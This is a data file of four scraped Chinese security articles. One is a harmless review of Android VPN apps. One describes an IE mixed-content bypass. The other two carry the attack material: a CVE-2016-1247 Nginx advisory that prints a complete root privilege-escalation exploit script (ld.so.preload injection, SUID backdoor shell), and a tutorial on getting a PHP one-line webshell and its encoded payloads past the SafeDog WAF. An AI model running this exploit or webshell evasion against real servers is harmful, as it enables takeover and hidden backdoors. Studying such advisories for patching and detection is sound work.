"5ccbfa3a4f2f0a0a7a69c032","毫无疑问，如今互联网正在一步一步向HTTPS安全迈进。大多数大公司都会将证书应用到他们的网站上，以获得安全保护。","kong","简介毫无疑问，如今互联网正在一步一步向HTTPS安全迈进。大多数大公司都会将证书应用到他们的网站上，以获得安全保护。这时你可能就有疑问了：这能保证安全到何种程度呢？除了可以抵御中间人攻击（MITM），网络嗅探/篡改等攻击，HTTPS 协议是否可以避免终端用户受到来自其他方面的攻击呢？答案是肯定的。众所周知，当前攻击者使用各种渠道来传播他们的恶意payload，恶意广告便是其中之一。他们购买廉价的广告空间来展示一些广告内容，但实际上，在这些banner之下，我们总是能够看到经过混淆的恶意代码。同时我们还了解到了这些攻击者是如何判定用户为潜在受害者或是安全研究人员：即如果键盘背后的人是一个毫无经验的用户，那么攻击者会提供完整的恶意payload，否则他们就会伪装成合法的广告。混合内容警告攻击者们最近这段事件应该有些头疼，因为他们的欺骗工作现在只在不安全的页面才生效了，而浏览器默认情况下不会在安全的网站展示不安全的内容。也就是说，如果攻击者需要被迫通过HTTPS加载代码，他们的很多欺骗行为（比如检测文件系统）会失效。设想一下：现下浏览器拒绝从安全的域(HTTPS)加载不安全的内容 (HTTP)。这也就是所谓的“混合内容”。我们打开一个HTTPS网页的时候，浏览器不会加载不安全的内容（例如，一个内含banner的HTTP iframe）。针对这些内容，IE浏览器将向用户发出“显示所有内容”（重新加载主页并显示所有混合内容）的选项。        Edge浏览器则会阻止这部分内容，除非用户使用开发者工具-控制台窗口查看，否则不会显示警告。另一方面，如果iframe的来源是不安全的，则会显示混乱的错误信息而不是HTTP内容。    允许加载图片但其实也存在例外，即所有浏览器都允许无限制加载并渲染不安全的图片。换句话说，如果攻击者已经在网络中进行嗅探，他们可以在远端查看以及替换图片。不过实际上，这并不代表着会对用户构成真正的威胁。早在2011年Eric Lawrence(aka: Internet Hero)就写了一篇解释IE团队允许不提示警告的情况下加载不安全图像的详细博文。这很有意义：许多网站使用HTTP协议从外部加载图片，更糟糕的是，它们在资源中硬编码了指向本地图片的HTTP协议，但内容本身（html/scripts）是安全的。所以，它们决定允许image标签加载没有警告的渲染器，当加载不安全的内容，地址栏右边的提示小锁会消失。以下为地址栏在IE上加载不安全图片前后的变化图。注意主地址栏的安全协议没有改变。   同样的事情我们在Microsoft Edge上进行尝试，但锁的图标在左边。如果你想体验这个过程，可以戳这里。有趣的是，两个浏览器都认为伪协议（res: mhtml: file:）是不安全的，所以就无法加载这些东西了（就像常规的http中夹杂https）：These iframes won't render anything if the main page is secure/https&lt;iframe src=""http://""&gt;  &lt;iframe src=""res://""&gt;  &lt;iframe src=""file://""&gt;  &lt;iframe src=""mhtml://""&gt;  &lt;iframe src=""mhtml:res://""&gt;伪协议行为你可能会想，HTTPS与这些奇怪的mhtml:和res:协议有什么联系？这些奇怪的协议被攻击者用来加载硬盘中的文件，以及用于检测本地文件的存在。如果主页是安全的，攻击者就遇到了一个大问题：IE会拒绝解析这些协议，也就避免了运行那些欺骗脚本！也就是说，安全页面，不仅帮助我们免受中间人攻击，而且还可以用来阻止执行攻击者的很多欺骗脚本。谨记：当攻击者想要在她的文件系统中检查用户是否存在特定文件，他们更倾向于滥用mhtml/res/file协议技术。 如果你从来没有见过相关技巧，建议先看看这篇博文，在这里只需明白一点：当下浏览器默认不允许“混合内容”，而且许多欺骗行为在HTTPS下是失效的。强制加载内容这样我们就解释清楚了攻击者的意图，所以就需要跟上脚步，尝试绕过这些警告。通过上面的内容，我们知道了在没有用户交互的情况下渲染内容的规则有一个例外情况（image 标签）——于是我尝试加载以IFRAME（而不是 IMG）作为源的图片 ，但并没有成功。之后使用EMBED和OBJECT 元素（两者都可以渲染html）也没真正成功。最后，我试着用常规IFRAME ，但是使用服务器重定向来代替直接使用不安全的URL设置其location属性。似乎能正常运行，内容最终成功加载。 Main page should be secure/httpsThe iframe below renders an insecure (http) bing.com&lt;iframe src=""https://www.cracking.com.ar/redir/redir.php?URL=http://www.bing.com""&gt;            作为安全研究人员，这个发现的确非常有趣，但是从攻击者的角度来看并没有什么大的卵用。我们已经能够在无用户交互的情况下加载混合内容：由于显示了不安全的内容，浏览器会弹出一个警告（bing.com真的是以http协议加载的），然而攻击者显然不希望会有这样的警示信息告知用户。不安全的bing.com试图渲染另一个不安全的内嵌iframe的时候，就会产生这个问题——各位可以体会一下。换言之，即便是在不安全的上级iframe嵌套下，次级嵌套的iframe也需要是安全的。当然我们也可以使用重定向再次加载，但是这并没什么用，因为攻击者想要加载IE伪协议（mhtml: res: 和 file:）来实现他们的欺骗行为，而IE拒绝服务器重定向至那些协议。所以我们需要有更好的选择。绕过警告信息我偶然找到了解决方案。我很惊讶，居然是那么基础的东西：在不安全的 iframe中放一个document.write就够了。可能这么简单吗？Main page should be secure/httpsThe iframe below renders an insecure (http) page which does a document.write&lt;iframe src=""https://www.cracking.com.ar/redir/redir.php?URL=http://unsafe.cracking.com.ar""&gt;The HTML code in the iframe is quite simple:&lt;script&gt;document.write()&lt;/script&gt;我们一旦加载了不安全的内容和document.write，该iframe就可以自由加载不安全的内容而无需重定向。换句话说，这时攻击者可以加载mhtml/res协议，无限制的施展他们的欺骗手段：IE不知道这些内容正在被渲染，每个嵌入的iframe将完美加载。            点击在线查看PoC最后值得一提的是，Edge浏览器虽然受到前面所述重定向欺骗的影响，但document.write这招没用。或许针对Edge浏览器还有其他方法可行，我就不继续下去了。得知攻击者实现他们恶意目的方式如此简单，我整个人都不好了。","2016-11-25 17:10:19","Web安全","在HTTPS安全页面中加载HTTP不安全的内容，如何绕过安全警告？","http://nsoad.com/Article/web/20161125/848.html"
"5ccbfa3a4f2f0a0a7a69c033","本文将告诉各位同学如何通过VPN来保护Android手机的隐私安全，你也许不需要花任何的钱，但免费的VPN应用也有其不足之处。","Alpha_h4ck","本文将告诉各位同学如何通过VPN来保护Android手机的隐私安全，你也许不需要花任何的钱，但免费的VPN应用也有其不足之处。在Android手机上使用VPN不仅可以帮助你访问那些被墙掉的内容，而且还可以让你在上网过程中保持匿名性。目前市场上有很多App可以给用户提供免费或收费的VPN服务，但是哪一款才是最适合你的呢？为此，我们专门对目前市场上最热门的六款AndroidVPN应用进行了测试，并对这些VPN服务的性能进行了全面的分析。当然了，你也可以选择使用其他厂商的VPN服务，或直接使用Android平台内置的VPN工具，经过一些自定义设置之后，Android内置的VPN工具同样会非常的好用。为什么要使用VPN？简单来说，VPN（虚拟专用网络）可以将你所有的网络通信数据汇集到一台远程服务器中，然后再由这台服务器将数据发送到目标地址。用户可以通过VPN来伪造定位数据，并掩盖自己的真实IP地址。VPN会对流经服务器的网络数据进行加密处理，并增加数据窃听者的攻击难度。从某种程度上来说，即便你使用的是不安全的WiFi网络，VPN也同样能够保障你的数据安全。由于VPN可以帮你伪造地理位置信息，所以你就可以利用VPN来访问某些受到地理限制的服务，例如脸书等等。但是在享受这种“畅通无阻”的服务时，用户也需要关注VPN服务提供商的安全问题，毕竟他们可以访问你所有的网络数据。就好比HolaVPN一样，这家VPN服务提供商存在严重的安全问题，所以用户应该尽量避免使用这类VPN。某些VPN会故意增加你通信链接中的网络节点“跳数”，并提高网络通信的延迟。用户在使用一个高速VPN时是不会感觉到高延迟的，但某些免费的移动端VPN服务甚至会让普通的视频通话都难以正常进行下去。每一款VPN服务的网速都是不同的，有的区别甚至是一个天一个地，所以网速也是我们需要测试的其中一个因素。TunnelBear【下载地址】特点：一款精巧的app，网速很快，提供了免费流量这款VPN的性能非常稳定，网速也非常快，而且没有任何的广告。TunnelBear使用起来也比市面上其他免费VPN的体验度要好得多，而且用户也可以随意选择世界各地的VPN服务器。TunnelBear唯一的一个不足之处就是可供用户免费使用的VPN流量有限，每位用户每月只有500MB的免费流量，但用户也可以通过发Twitter帮它做广告来换取更多的免费流量。如果你想要无限流量的话，每个月支付4美金就可以了。不过在使用之前，你还需要注册一个TunnelBear账号。Opera VPN【下载地址】特点：免费，MaterialDesign风格，速度快在我们所测试的VPN服务中，OperaVPN属于速度较快的那一类，但它偶尔也会出现网络中断的情况。虽然App中有广告，但并不会影响用户的正常使用。需要注意的是，OperaVPN没有对BT下载进行限制。目前OperaVPN只有五个地区的服务器可供用户使用，但该服务是免费的，而且速度也非常快，作为一款免费产品绝对是良心之作了。Betternet【下载地址】特点：速度慢，免费版的可选设置项非常少Betternet的App设计得算是很不错了，当VPN处于运行状态时广告不会老是弹出来，只有当你打开App的时候才会弹出一个全屏广告。但是它最大的一个问题就是速度太慢了，在我的两次测试过程中，Betternet的网速都没超过1MB。而且免费版也不支持用户手动选择服务器，所以得到的服务器质量好坏全凭运气，很明显我测试的时候运气就不是很好。Betternet的付费版本每个月为12美金，付费版的网速会快很多，支持用户手动选择服务器，而且也没有任何的广告。Turbo VPN【下载地址】特点：免费，速度稳定Turbo VPN的速度其实并非真的像自带涡轮增压一样快，但是它的网速非常稳定。它的App非常简洁干净，在界面上只有一只躺着的兔子。我个人很喜欢这种设计，但不足之处就是它老是会弹出各种全屏广告，这我就不能忍了。Turbo VPN只有五个地区的服务器可供选择，但作为一款免费的VPN服务，你还想要求什么呢？如果没有那么多烦人的广告，那么相比OperaVPN来说，我更愿意使用TurboVPN。但广告是别人赚钱的方式，所以怎样选择就看用户自己了。Hotspot Shield【下载地址】特点：速度极快，广告较多在整个测试过程中，HotspotShield的网速是最快的，而且比其他的VPN服务要快很多。它也会弹广告，虽然广告数量没有TurboVPN那么多，但也足够烦人的了。App的使用非常简单，设计得也非常简洁。不幸的是，免费版可选的服务器数量非常少。付费版的HotspotShield每个月为12美金，但它不仅仅只是Android端的VPN工具，HotspotShield的许可证也可以在Windows或Mac端使用。如果你只在Android端使用的话，这个价格就有些不划算了。SuperVPN【下载地址】特点：速度不是最快的，可选服务器较少，广告超级多在我的测试过程中，SuperVPN并不是最快的那一个，而且也有大量的广告，它算是广告数量最多的那一个了。这也就算了，但免费版的SuperVPN只有四个地区的服务器可供选择，这就不能忍了。付费版价格为每月5美金，你可以享受速度更快且无广告的VPN服务。但是用户还需要一个单独的支付程序来付款，这就非常奇怪了。也许没有多少用户会选择使用SuperVPN吧？手动配置VPNVPN的世界可不是一个PlayStore应用商店能装得下的，VPN服务提供商为多种平台都提供了VPN服务，你可以用你的VPN账号在Android系统上建立自己的原生VPN链接。虽然你可能需要多花一点时间，但这种方式更加便宜，而且功能也更强大。目前最常用的VPN服务应该就是Private Internet Access、NordVPN和KeepSolid了。它们都会给用户提供服务器和账号的详细信息，你可以将其添加到Android的VPN菜单中。新建一个VPN链接，然后将VPN供应商提供给你的账号和密码输入进去，一般也无需你去进行任何高级设置就可以连接成功了。不过烦人的一点就是，如果你想使用另一台VPN服务器的话，你就要新建一个VPN链接了。除此之外，当你每次要开启或关闭VPN服务时，你都要进入到系统设置菜单之中。当然了，你也可以为你的VPN在桌面建立一个快捷方式之类的来方便操作。结束语当你连接到了一个不受信任的网络时，无论你上网的目的是什么，使用VPN绝对是好处大于坏处的，这也是一种非常好的习惯。我相信，随着人们的安全意识和隐私意识日益增强，VPN肯定会成为每个人手机中必不可少的东西。","2017-02-15 00:25:29","安全工具","安卓系统里最好用的VPN工具汇总","http://nsoad.com/Security-tools/20170215/tools-1061.html"
"5ccbfa3a4f2f0a0a7a69c034","Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。","kong","漏洞发现人：Dawid GolunskiCVE编号  ：CVE-2016-1247发行日期  ：15.11.2016安全级别  ：高背景介绍Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。 Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor Sysoev所开发，其特点是占有内存少，并发能力强。漏洞描述Debian、Ubuntu发行版的Nginx在新建日志目录的时，使用了不安全的权限，因此本地恶意攻击者可以从nginx/web用户权限(www-data)提升到ROOT。漏洞概要Debian发行版的Nginx本地提权漏洞，该漏洞已经在1.6.2-5+deb8u3中修复因为该漏洞细节是在官方修复后公布的，因此请低版本的Debian/ubuntu用户及时更新补丁：补丁修复情况：Debian:在Nginx 1.6.2-5+deb8u3中修复Ubuntu:Ubuntu 16.04 LTS:在1.10.0-0ubuntu0.16.04.3中修复Ubuntu 14.04 LTS:在1.4.6-1ubuntu3.6中修复Ubuntu 16.10:在1.10.1-0ubuntu1.1中修复漏洞细节基于Debian系统默认安装的Nginx会在下面的路径使用下面的权限新建Nginx日志目录[email protected]/*  */:~# ls -ld /var/log/nginx/drwxr-x--- 2 www-data adm 4096 Nov 12 22:32 /var/log/nginx/[email protected]/*  */:~# ls -ld /var/log/nginx/*-rw-r----- 1 www-data adm         0 Nov 12 22:31 /var/log/nginx/access.log-rw-r--r-- 1 root     root    0 Nov 12 22:47 /var/log/nginx/error.log我们可以看到/var/log/nginx目录的拥有者是www-data，因此本地攻击者可以通过符号链接到任意文件来替换日志文件，从而实现提权。攻击者通过符号链接替换了日志文件后，需要等nginx daemon重新打开日志文件，因此需要重启Nginx，或者nginx damon接受USR1进程信号。这里亮点来了，USR1进程信号会在默认安装的Nginx通过logrotate脚本调用的do_rotate()函数自动触发。--------[ /etc/logrotate.d/nginx ]--------/var/log/nginx/*.log {dailymissingokrotate 52compressdelaycompressnotifemptycreate 0640 www-data admsharedscriptsprerotateif [ -d /etc/logrotate.d/httpd-prerotate ]; then \run-parts /etc/logrotate.d/httpd-prerotate; \fi \endscriptpostrotateinvoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1endscript}[...]do_rotate() {        start-stop-daemon --stop --signal USR1 --quiet --pidfile $PID --name $NAME        return 0}[...]我们可以看到logrotation脚本会在corn中每天6:25AM自动调用，因此如果/etc/logrotate.d/nginx已经设置了'daily'日志回滚，攻击者将在不需要任何系统管理员交互的情况下，在24小时内实现提权到ROOT漏洞验证截图POC#!/bin/bash## Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit# nginxed-root.sh (ver. 1.0)## CVE-2016-1247## Discovered and coded by:## Dawid Golunski# dawid[at]legalhackers.com## https://legalhackers.com## Follow https://twitter.com/dawid_golunski for updates on this advisory.## ---# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu# etc.) to escalate their privileges from nginx web server user (www-data) to root # through unsafe error log handling.## The exploit waits for Nginx server to be restarted or receive a USR1 signal.# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)# script which is called daily by the cron.daily on default installations.# The restart should take place at 6:25am which is when cron.daily executes.# Attackers can therefore get a root shell automatically in 24h at most without any admin# interaction just by letting the exploit run till 6:25am assuming that daily logrotation # has been configured. ### Exploit usage:# ./nginxed-root.sh path_to_nginx_error.log ## To trigger logrotation for testing the exploit, you can run the following command:## /usr/sbin/logrotate -vf /etc/logrotate.d/nginx## See the full advisory for details at:# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html## Video PoC:# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html### Disclaimer:# For testing purposes only. Do no harm.#BACKDOORSH=""/bin/bash""BACKDOORPATH=""/tmp/nginxrootsh""PRIVESCLIB=""/tmp/privesclib.so""PRIVESCSRC=""/tmp/privesclib.c""SUIDBIN=""/usr/bin/sudo""function cleanexit {# Cleanup echo -e ""\n[+] Cleaning up...""rm -f $PRIVESCSRCrm -f $PRIVESCLIBrm -f $ERRORLOGtouch $ERRORLOGif [ -f /etc/ld.so.preload ]; thenecho -n &gt; /etc/ld.so.preloadfiecho -e ""\n[+] Job done. Exiting with code $1 \n""exit $1}function ctrl_c() {        echo -e ""\n[+] Ctrl+C pressed""cleanexit 0}#intro cat &lt;&lt;_eascii_ _______________________________&lt; Is your server (N)jinxed ? ;o &gt; -------------------------------           \             \          __---__                    _-       /--______               __--( /     \ )XXXXXXXXXXX\v.               .-XXX(   O   O  )XXXXXXXXXXXXXXX-             /XXX(       U     )        XXXXXXX\           /XXXXX(              )--_  XXXXXXXXXXX\          /XXXXX/ (      O     )   XXXXXX   \XXXXX\          XXXXX/   /            XXXXXX   \__ \XXXXX         XXXXXX__/          XXXXXX         \__----&gt; ---___  XXX__/          XXXXXX      \__         /   \-  --__/   ___/\  XXXXXX            /  ___--/=    \-\    ___/    XXXXXX              '--- XXXXXX       \-\/XXX\ XXXXXX                      /XXXXX         \XXXXXXXXX   \                    /XXXXX/          \XXXXXX      &gt;                 _/XXXXX/            \XXXXX--__/              __-- XXXX/             -XXXXXXXX---------------  XXXXXX-                \XXXXXXXXXXXXXXXXXXXXXXXXXX/                  """"VXXXXXXXXXXXXXXXXXXV""""_eascii_echo -e ""\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n""echo -e ""Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m""# Argsif [ $# -lt 1 ]; thenecho -e ""\n[!] Exploit usage: \n\n$0 path_to_error.log \n""echo -e ""It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n""exit 3fi# Priv checkecho -e ""\n[+] Starting the exploit as: \n\033[94m`id`\033[0m""id | grep -q www-dataif [ $? -ne 0 ]; thenecho -e ""\n[!] You need to execute the exploit as www-data user! Exiting.\n""exit 3fi# Set target pathsERRORLOG=""$1""if [ ! -f $ERRORLOG ]; thenecho -e ""\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\n""exit 3fi# [ Exploitation ]trap ctrl_c INT# Compile privesc preload libraryecho -e ""\n[+] Compiling the privesc shared library ($PRIVESCSRC)""cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC#define _GNU_SOURCE#include #include #include #include        #include        #include        #include uid_t geteuid(void) {static uid_t  (*old_geteuid)();old_geteuid = dlsym(RTLD_NEXT, ""geteuid"");if ( old_geteuid() == 0 ) {chown(""$BACKDOORPATH"", 0, 0);chmod(""$BACKDOORPATH"", 04777);unlink(""/etc/ld.so.preload"");}return old_geteuid();}_solibeof_/bin/bash -c ""gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl""if [ $? -ne 0 ]; thenecho -e ""\n[!] Failed to compile the privesc lib $PRIVESCSRC.""cleanexit 2;fi# Prepare backdoor shellcp $BACKDOORSH $BACKDOORPATHecho -e ""\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`""# Safety checkif [ -f /etc/ld.so.preload ]; thenecho -e ""\n[!] /etc/ld.so.preload already exists. Exiting for safety.""exit 2fi# Symlink the log filerm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOGif [ $? -ne 0 ]; thenecho -e ""\n[!] Couldn't remove the $ERRORLOG file or create a symlink.""cleanexit 3fiecho -e ""\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`""# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggeredcurl http://localhost/ &gt;/dev/null 2&gt;/dev/null# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily # rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)echo -ne ""\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...""while :; do sleep 1if [ -f /etc/ld.so.preload ]; thenecho $PRIVESCLIB &gt; /etc/ld.so.preloadrm -f $ERRORLOGbreak;fidone# /etc/ld.so.preload should be owned by www-data user at this point# Inject the privesc.so shared library to escalate privilegesecho $PRIVESCLIB &gt; /etc/ld.so.preloadecho -e ""\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`""echo -e ""\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload""echo -e ""\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`""chmod 755 /etc/ld.so.preload# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)echo -e ""\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!""sudo 2&gt;/dev/null &gt;/dev/null# Check for the rootshellls -l $BACKDOORPATHls -l $BACKDOORPATH | grep rws | grep -q rootif [ $? -eq 0 ]; then echo -e ""\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`""echo -e ""\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m""elseecho -e ""\n[!] Failed to get root""cleanexit 2firm -f $ERRORLOGecho &gt; $ERRORLOG  # Use the rootshell to perform cleanup that requires root privilges$BACKDOORPATH -p -c ""rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB""# Reset the logging to error.log$BACKDOORPATH -p -c ""kill -USR1 `pidof -s nginx`""# Execute the rootshellecho -e ""\n[+] Spawning the rootshell $BACKDOORPATH now! \n""$BACKDOORPATH -p -i# Job done.cleanexit 0：Debian、ubuntu发行版的Nginx本地提权漏洞（含POC）修复方案升级为最新的Nginx软件包https://www.debian.org/security/2016/dsa-3701https://www.ubuntu.com/usn/usn-3114-1/参考链接http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html","2016-11-16","漏洞发布","CVE-2016-1247：Debian、Ubuntu发行版的Nginx本地提权漏洞（含POC）","http://nsoad.com/Article/exploit/20161116/vulzone-35.html"
"5ccbfa3a4f2f0a0a7a69c035","既然木马已就绪，那么想要利用木马，必然有一个数据传输的过程，数据提交是必须的，数据返回一般也会有的，除非执行特殊命令。","kong","先知技术社区独家发表本文，如需要转载，请先联系先知技术社区授权；未经授权请勿转载。既然木马已就绪，那么想要利用木马，必然有一个数据传输的过程，数据提交是必须的，数据返回一般也会有的，除非执行特殊命令。当我们用普通菜刀连接后门时，数据时如何提交的，狗狗又是如何识别的，下面结合一个实例，用通俗易懂的方式来演示数据提交层直接过狗原理。本文意义：纵使网上有很多修改菜刀过狗的方法，但是我都看了下，局限性比较大，而且不太系统，新人学了可能会只是其一不知其二### 环境：域名与服务器均为个人真实所有。服务器开启网站安全狗+服务器安全狗，引擎全部开启，最高防护级别。### 对比环境：服务器：apache+php5.3；本地：nginx+php5.3无狗环境作为对比本地与有狗服务器具有相同的后门代码与链接方式说明：本文仅分析过狗原理与代码实现，技术层面探讨，菜刀或者其他软件制作与修改本文不予讨论。### 后门文件：$a=array(base64_decode($_REQUEST['a']));@array_map(""assert"",$a);菜刀连接方式：http://localhost/test.php?xx=YXNzZXJ0KCRfUkVRVUVTVFsnc29maWEnXSk=     密码：sofia该文件特征层面可过狗 ，上一篇文章已提到，我们知道，菜刀已存在这么多年，安全狗早已对菜刀的特征门清，我们先来看下菜刀连接的时候特征是什么。这是我随便连接的一个后门，其实不管后门代码是什么，打开文件管理，菜刀提交的数据都是一样的，如图代码为：[email protected]/*  */(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7命令执行代码，base64_decode结果为以下，获取当前目录与磁盘名@ini_set(""display_errors"",""0"");@set_time_limit(0);@set_magic_quotes_runtime(0);echo(""-&gt;|"");;$D=dirname($_SERVER[""SCRIPT_FILENAME""]);echo $D.""\t"";if(substr($D,0,1)!=""/""){foreach(range(""A"",""Z"") as $L)if(is_dir($L."":""))echo($L."":"");};echo(""|&lt;-"");die();其中参数名“sofia”就是我们所谓的菜刀密码不需要多解释吧？那么我们在本地手工提交菜刀的post数据看一下：本地正常返回当前目录与磁盘名，而服务端未显示，一定是被拦截咯，事实证明确实如此：那为什么没蹦出拦截框呢？根据我的经验，一般文件特征层能检测到是后门，才会弹窗，数据层一般不弹，当然，这只是我个人见解，可能不严谨。其实狗狗对后门的检测文件特征是与数据提交检测机制是完全独立的。为了验证这一点，我在同目录下建立一个null.php，内容为正常代码：当不post数据时，正常输出内容，说明文件本身没有问题把狗狗的post数据发一下试试？又没有回显了，再去狗狗日志看下：### 菜刀特征分析那么很明显了，菜刀的post数据已经是个大特征了。相信大家都能看出来这个eval太惹眼了（当然，其他版本或者其他waf检测的可能会是$_POST，或base64_decode）[email protected]/*  */(base64_decode($_POST[z0]));虽然看上去数据提交不怎么注重隐蔽，但是不得不承认菜刀是个伟大发明。因为php后门五花八门，接受数据的类型与格式各不相同，于是菜刀就在post数据中再次构造一个执行代码，使得php后门接收到的数据全部统一为：“eval('执行命令')”，这样才使得菜刀的易用性才那么强。具体代码执行与返回请参考上一章节## 修改post数据既然原因清楚了，我们接下来就修改post数据，修改的重点就在于替换eval特征。### 思路一：分离“eval”四个字母即可但是post数据中发挥空间太小，暂时没想到什么好办法，当然不同的waf检测的关键词也有所不同### 思路二：修改后门文件，直接执行语句这里可能就需要用一些其他回调函数，或者其他猥琐姿势，能够直接执行来自post的base64加密后的纯执行语句。### 思路三：直接手工构造eval语句前面说过，post数据最终的结果为：eval('执行命令')”，而且我们的语句对a参数已经decode的了$a=array(base64_decode($_REQUEST['a']));那么就直接把整个eval语句base64加密一下即可，那么我们菜刀原始的利用语句可以这么构造：eval('@ini_set(""display_errors"",""0"");@set_time_limit(0);@set_magic_quotes_runtime(0);echo(""-&gt;|"");;$D=dirname($_SERVER[""SCRIPT_FILENAME""]);echo $D.""\t"";if(substr($D,0,1)!=""/""){foreach(range(""A"",""Z"") as $L)if(is_dir($L."":""))echo($L."":"");};echo(""|&lt;-"");die();')然后把这句话base64加密下，得到：ZXZhbCgnQGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7Jyk=ok，那么这时候我们是直接把这句话传给$a的，那么post数据为：a=ZXZhbCgnQGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7Jyk=试试？成功返回结果，换个语句试试？至此，这是数据流层面的过狗方式，当然过狗思路千千万，不限于这一种，更多的是需要大家去发掘。另外，这里要跟大家提一点，assert函数与eval函数是完全不同的函数，不要以为能出phpinfo()结果就是过狗了，assert能执行phpinfo()一类的函数，但是其他php语句还是是需要借用eval的，当然，执行命令也不限于eval，还有各种回调函数。写在最后怎么？你是不是还想问菜刀怎么连？本文开头说了，这里仅讨论技术本身，至于如何去用，那么，会php的人，看了这篇文字，应该已经有思路了，而不会php的人，可能就想着：“博客赶紧给我来个一句话加软件，最好打开就能用”，然后偷偷窃喜指望它能平天下。我还是那句话，安全之路，我们大多数人还只是个学者，希望多关注技术本身，不要膨胀才好。php一句话后门过狗姿势万千之传输层加工【一】【本文转自先知技术社区  作者：sofia  网络攻防小组编辑整理发布】","2016-11-29 19:26:24","Web安全","php一句话后门过狗姿势万千之传输层加工【二】","http://nsoad.com/Article/web/20161129/870.html"
